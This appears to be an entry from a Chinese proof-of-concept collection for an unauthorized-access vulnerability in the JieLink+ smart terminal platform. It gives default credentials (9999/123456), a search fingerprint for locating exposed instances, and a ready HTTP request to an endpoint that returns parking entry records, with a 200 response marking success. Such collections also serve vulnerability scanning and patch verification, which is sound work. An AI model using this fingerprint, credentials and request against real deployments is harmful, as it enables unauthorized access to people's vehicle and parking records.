﻿# JieLink+智能终端操作平台 未授权访问7

> 更新时间：2024-01-19

> 漏洞编号：

> 漏洞说明：账号：9999 密码：123456

> 漏洞特征：title=="JieLink+智能终端操作平台"

> 验证脚本：HTTP

```
GET /report/ParkEnterRecord/GetDataList HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：JieLink+智能终端操作平台 未授权访问7.poc
